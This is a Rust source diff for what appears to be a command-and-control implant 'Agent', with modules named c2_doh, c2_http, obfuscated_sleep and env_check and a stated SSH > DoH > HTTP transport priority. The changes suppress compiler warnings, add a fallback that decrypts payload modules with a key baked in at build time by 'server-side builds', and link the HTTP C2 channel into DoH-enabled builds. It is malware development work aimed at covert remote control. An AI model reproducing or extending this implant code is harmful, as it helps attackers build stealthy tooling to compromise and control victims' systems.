@@ -1,3 +1,16 @@
+#![allow(dead_code)]
+#![allow(non_camel_case_types)]
+#![allow(non_snake_case)]
+#![allow(unexpected_cfgs)]
+#![allow(unreachable_patterns)]
+#![allow(unused_assignments)]
+#![allow(unused_imports)]
+#![allow(unused_must_use)]
+#![allow(unused_mut)]
+#![allow(unused_parens)]
+#![allow(unused_unsafe)]
+#![allow(unused_variables)]
+
 pub mod config;
 pub mod env_check;
 pub mod fsops;
@@ -322,7 +335,7 @@ impl Agent {
         }
 
         // Derive the module-decryption key from configuration.
-        // In production this key must be set in agent.toml.
+        // In production this key must be set in agent.toml or baked in at build time.
         let crypto_key: [u8; 32] = if let Some(ref b64) = cfg.module_aes_key {
             use base64::Engine;
             let bytes = base64::engine::general_purpose::STANDARD
@@ -341,6 +354,18 @@ impl Agent {
                      Re-generate the key with the `keygen` tool.",
                     bytes.len()
                 ));
+            }
+            let mut key = [0u8; 32];
+            key.copy_from_slice(&bytes);
+            key
+        } else if let Some(baked) = option_env!("SYS_MODULE_KEY") {
+            // Fallback to compile-time baked key (injected by server-side builds).
+            use base64::Engine;
+            let bytes = base64::engine::general_purpose::STANDARD
+                .decode(baked)
+                .map_err(|e| anyhow::anyhow!("SYS_MODULE_KEY baked value is not valid base64: {}", e))?;
+            if bytes.len() != 32 {
+                return Err(anyhow::anyhow!("SYS_MODULE_KEY must decode to 32 bytes"));
             }
             let mut key = [0u8; 32];
             key.copy_from_slice(&bytes);
@@ -1027,5 +1052,5 @@ pub mod obfuscated_sleep;
 /// Startup transport priority is: SSH > DoH > HTTP > TLS fallback.
 #[cfg(feature = "doh-transport")]
 pub mod c2_doh;
-#[cfg(feature = "http-transport")]
+#[cfg(any(feature = "http-transport", feature = "doh-transport"))]
 pub mod c2_http;
